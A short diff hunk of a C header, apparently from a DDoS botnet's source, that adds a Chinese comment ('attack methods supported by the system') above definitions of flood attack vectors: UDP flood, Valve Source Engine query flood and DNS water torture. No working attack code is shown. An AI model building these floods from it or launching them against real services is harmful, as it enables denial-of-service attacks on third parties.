@@ -31,6 +31,8 @@ struct attack_option {
 typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 typedef uint8_t ATTACK_VECTOR;
 
+
+//系统支持的攻击方式
 #define ATK_VEC_UDP        0  /* Straight up UDP flood */
 #define ATK_VEC_VSE        1  /* Valve Source Engine query flood */
 #define ATK_VEC_DNS        2  /* DNS water torture */
